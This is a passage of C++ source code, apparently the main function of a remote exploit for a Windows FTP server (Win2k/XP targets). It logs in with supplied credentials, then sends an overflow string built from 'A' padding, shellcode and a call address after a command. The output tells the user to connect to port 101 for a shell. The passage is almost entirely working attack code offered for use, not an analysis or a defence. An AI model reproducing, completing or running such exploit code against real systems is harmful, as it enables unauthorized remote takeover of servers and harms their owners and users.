int main(int argc,char *argv[])
{
        ver();
        if ((argc<5)||(argc>6)||(atoi(argv[1])<1)||(atoi(argv[1])>2)){usage(argv[0]);return -1;}
        if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
        char *login=argv[2], *passwd=argv[3], data[10], recvbuf2[100], recvbuf[100], rootbuf[100], logbuf[100], logbuf2[100], pdbuf[100], pdbuf2[100];
        int ip=htonl(inet_addr(argv[4])), sz, a, sizeA, lgth, port;
        if (argc==6){port=atoi(argv[5]);}
        else port=21;
        char *os;
        if (atoi(argv[1]) == 1){os="Win2k based system";}
        if (atoi(argv[1]) == 1){os="Win2k based system";}
        if (atoi(argv[1]) == 2){os="WinXP based system";}
        if (atoi(argv[1]) == 2){os="WinXP based system";}
        SOCKET s;
        struct fd_set mask;
        struct timeval timeout;
        struct sockaddr_in server;
        s=socket(AF_INET,SOCK_STREAM,0);
        if (s==INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
        cout<<"[+] target: "<<os<<endl;
        server.sin_family=AF_INET;
        server.sin_addr.s_addr=htonl(ip);
        server.sin_port=htons(port);
        WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
        timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
        switch(select(s+1,NULL,&mask,NULL,&timeout))
        {
                case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
                case 0: {cout<<"[+] connect() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
                default:
                if(FD_ISSET(s,&mask))
                {
                        cout<<"[+] connected, login in process..."<<endl;
                        Sleep(100);recv(s,recvbuf2,100,0);
                        if (!strstr(recvbuf2,"220")){cout<<"[+] this is not an ftp server, quitting..."<<endl;return -1;}
                        strcpy(logbuf,"USER ");strcpy(logbuf2,login);strcpy(pdbuf,"PASS ");strcpy(pdbuf2,passwd);strcpy(rootbuf,"STOU AUX");strcpy(data,"\r\n");
                        if (send(s,logbuf,strlen(logbuf),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,logbuf2,strlen(logbuf2),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,data,strlen(data),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        Sleep(1000);
                        if (send(s,pdbuf,strlen(pdbuf),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,pdbuf2,strlen(pdbuf2),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (send(s,data,strlen(data),0)==SOCKET_ERROR) { cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        Sleep(1000);
                        if (recv(s,recvbuf,200,0)==SOCKET_ERROR){ cout<<"[+] Error during the login processus, check the ftp."<<endl;return -1;}
                        if (strstr(recvbuf,"530")){ cout<<"[+] wrong login or passwd"<<endl;return -1;}
                        cout<<"[+] login success!"<<endl;Sleep(1000);cout<<"[+] sending the exploit string"<<endl;
                        if (atoi(argv[1]) == 1){lgth=500+1;}
                        if (atoi(argv[1]) == 2){lgth=498+1;}
                        sizeA=lgth-sizeof(scode);
                        sz=(sizeA-1)+sizeof(scode)+10;
                        memset(payload,0,sizeof(payload));
                        strcat(payload,cmd);strcat(payload,"\x41\x41\x41");
                        strcat(payload,scode);
                        for (a=0;a<sizeA;a++){strcat(payload,"\x41");}
                        strcat(payload,call);
                        strcat(payload,"\r\n");
                        Sleep(1000);
                    if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
                        if (send(s,data,strlen(data),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
                        Sleep(1000);
                        cout<<"[+] size of payload: "<<sz<<endl;
                        cout<<"[+] payload send, connect the port 101 to get a shell."<<endl;
                        return 0;
                }
        }
        closesocket(s);
        WSACleanup();
        return 0;
}